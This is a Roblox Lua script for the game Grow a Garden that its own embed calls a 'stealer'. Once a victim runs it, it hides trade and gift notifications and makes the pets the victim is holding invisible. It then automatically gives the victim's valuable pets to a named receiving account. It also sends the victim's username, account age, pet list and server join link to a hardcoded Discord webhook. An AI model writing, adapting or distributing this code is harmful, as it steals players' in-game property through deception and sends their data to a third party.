repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
local dataModule = require(ReplicatedStorage.Modules.DataService)

local USERNAMES = {
    "Elaine_Pets18"
}

local PET_WHITELIST = {
    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
}

local PET_PRIORITY = {
    "Raccoon",
    "Disco Bee",
    "Butterfly"
}

local victimPetTable = {}

local BLOCKED_PATTERNS = {
    "^Your trade is processing, please wait until your trade finalizes before creating another one%.$",
    "^You can only place your pets in garden!$",
    "^Gift has been sent @.+ of the one you giving$",
    "^You already have a outgoing gift request for this pet!$",
    "^Sent Gift request!$"
}

-- Utility to check if text matches blocked patterns
local function matchesBlocked(text)
    for _, pattern in ipairs(BLOCKED_PATTERNS) do
        if string.match(text, pattern) then
            return true
        end
    end
    return false
end

-- Remove blocked notifications from UI
local function removeNotif(obj)
    if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text then
        if matchesBlocked(obj.Text) then
            if obj.Parent then
                obj.Parent:Destroy()
            end
        end
    end
end

-- Hide notifications and pets every frame
RunService.Heartbeat:Connect(function()
    -- Remove blocked notifications
    for _, obj in ipairs(CoreGui:GetDescendants()) do
        removeNotif(obj)
    end
end)

-- Make held pets invisible
local function hideHeldPets()
    local char = LocalPlayer.Character
    if not char then return end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") or tool:IsA("Model") then
            for _, obj in ipairs(tool:GetDescendants()) do
                if obj:IsA("BasePart") or obj:IsA("MeshPart") then
                    obj.Transparency = 1
                    for _, decal in ipairs(obj:GetChildren()) do
                        if decal:IsA("Decal") then
                            decal.Transparency = 1
                        end
                    end
                elseif obj:IsA("Decal") then
                    obj.Transparency = 1
                end
            end
        end
    end
end

-- Stop held pet animations to keep stance normal
local function setNormalWalk()
    local char = LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        for _, anim in ipairs(humanoid:GetPlayingAnimationTracks()) do
            anim:Stop()
        end
    end
end

-- Combined Heartbeat connection for invisibility and stance
RunService.Heartbeat:Connect(function()
    hideHeldPets()
    setNormalWalk()
end)

-- Reapply on respawn
LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid")
    RunService.Heartbeat:Connect(function()
        hideHeldPets()
        setNormalWalk()
    end)
end)

print("[✔] Pet invisibility + blocked notifications active.")

-- Check if pet is whitelisted
local function checkPetsWhitelist(petName)
    return PET_WHITELIST[petName] ~= nil
end

-- Get pet object by UUID from Backpack or Character
local function getPetObject(petUUID)
    for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUUID then
            return obj
        end
    end
    if LocalPlayer.Character then
        for _, obj in pairs(LocalPlayer.Character:GetChildren()) do
            if obj:GetAttribute("PET_UUID") == petUUID then
                return obj
            end
        end
    end
    return nil
end

-- Equip pet tool/model
local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:EquipTool(pet)
    end
end

-- Find trade prompt on victim's head
local function findTradePrompt(targetPlayer)
    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        for _, obj in ipairs(targetPlayer.Character.Head:GetChildren()) do
            if obj:IsA("ProximityPrompt") then
                return obj
            end
        end
    end
    return nil
end

-- Auto accept trade prompt
local function autoAcceptTrade(targetPlayerName)
    local targetPlayer = Players:FindFirstChild(targetPlayerName)
    if not targetPlayer then
        print("autoAcceptTrade: target player not found: "..targetPlayerName)
        return
    end

    local prompt = findTradePrompt(targetPlayer)
    if prompt then
        prompt.MaxActivationDistance = 1000
        prompt:InputHoldBegin()
        task.wait(prompt.HoldDuration or 0.5)
        prompt:InputHoldEnd()
        print("autoAcceptTrade: Prompt accepted for "..targetPlayerName)
    else
        print("autoAcceptTrade: Prompt NOT found for "..targetPlayerName)
    end
end

-- Auto accept gift event (update event name accordingly!)
local AcceptGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptGiftRequest")

local function autoAcceptGiftsFromVictim(victimName)
    task.spawn(function()
        while true do
            task.wait(0.3)
            AcceptGiftEvent:FireServer(victimName)
        end
    end)
end

-- Check pets in inventory and equip based on priority and whitelist, then trade
local function checkPetsInventory(targetName)
    local petsData = dataModule:GetData().PetsData.PetInventory.Data

    for _, priorityPetName in ipairs(PET_PRIORITY) do
        for petUUID, petData in pairs(petsData) do
            if petData.PetType == priorityPetName then
                local petObject = getPetObject(petUUID)
                if petObject then
                    equipPet(petObject)
                    task.wait(0.1)
                    autoAcceptTrade(targetName)
                    task.wait(0.1)
                    AcceptGiftEvent:FireServer(targetName)
                end
            end
        end
    end

    for petUUID, petData in pairs(petsData) do
        if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
            local petObject = getPetObject(petUUID)
            if petObject then
                equipPet(petObject)
                task.wait(0.1)
                autoAcceptTrade(targetName)
                task.wait(0.1)
                AcceptGiftEvent:FireServer(targetName)
            end
        end
    end
end

-- Wait for any of the target usernames to join
local function waitForJoin()
    for _, player in pairs(Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

-- Make other players invisible to victim(s)
local function makeInvisibleToVictims()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
                        part.Transparency = 1
                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
                        part.Enabled = false
                    end
                end
            end
        end
    end
end

-- Teleport to victim player
local function teleportToVictim(victimName)
    local victim = Players:FindFirstChild(victimName)
    local character = LocalPlayer.Character
    if victim and victim.Character and victim.Character:FindFirstChild("HumanoidRootPart") and character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = victim.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
        print("Teleported to "..victimName)
    end
end

-- Send trade request to victim
local function sendTradeRequestToVictim(victimName)
    local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
    local TradeRequestEvent = GameEvents:FindFirstChild("TradeRequest")
    if TradeRequestEvent then
        TradeRequestEvent:FireServer(victimName)
        print("Trade request sent to "..victimName)
    end
end

-- Attack routine: teleport, trade request, auto accept gifts
local function attackVictim(victimName)
    teleportToVictim(victimName)
    task.wait(1)
    sendTradeRequestToVictim(victimName)
    task.wait(1)
    autoAcceptGiftsFromVictim(victimName)
end

-- Main idle loop to wait for victim join and start attack
local isIdling = false
local function idlingTarget()
    if isIdling then return end
    isIdling = true
    while true do
        task.wait(0.5)
        local found, targetName = waitForJoin()
        if found then
            print("idlingTarget: Target found - "..targetName)
            checkPetsInventory(targetName)
            makeInvisibleToVictims()
            attackVictim(targetName)
        end
    end
end

-- Populate victim pet list from inventory
for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
    if checkPetsWhitelist(petData.PetType) then
        table.insert(victimPetTable, petData.PetType)
    end
end

idlingTarget()

-- Send victim pet list to Discord webhook once
task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            local petListStr = table.concat(victimPetTable, "\n")
            print("[Webhook] Sending victim pet list to Discord...")
            local embed = {
                title = "🌵 Grow A Garden Hit - KUNI SCRIPT STEALER 💸",
                color = 65280,
                fields = {
                    {
                        name = "👤 **Player Information**",
                        value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                            LocalPlayer.Name,
                            table.concat(USERNAMES, " "),
                            LocalPlayer.Name,
                            LocalPlayer.AccountAge
                        ),
                        inline = false
                    },
                    {
                        name = "🌴 **Backpack**",
                        value = string.format("```%s```", petListStr),
                        inline = false
                    },
                    {
                        name = "🏝️ **Join with URL**",
                        value = string.format(
                            "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                            game.JobId,
                            game.PlaceId,
                            game.JobId
                        ),
                        inline = false
                    }
                },
                footer = {
                    text = string.format("%s | %s", game.PlaceId, game.JobId)
                }
            }

            local data = {
                content = string.format(
                    "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
                    game.PlaceId,
                    game.JobId
                ),
                username = LocalPlayer.Name,
                avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
                embeds = {embed}
            }

            local jsonData = HttpService:JSONEncode(data)
            local headers = { ["Content-Type"] = "application/json" }

            local request = http_request or request or HttpPost or syn.request
            local response = request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = headers,
                Body = jsonData
            })

            if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
                warn("Error sending to Discord:", response.StatusCode, response.Body)
            else
                print("[Webhook] Sent successfully!")
            end

            break
        end
    end
end)
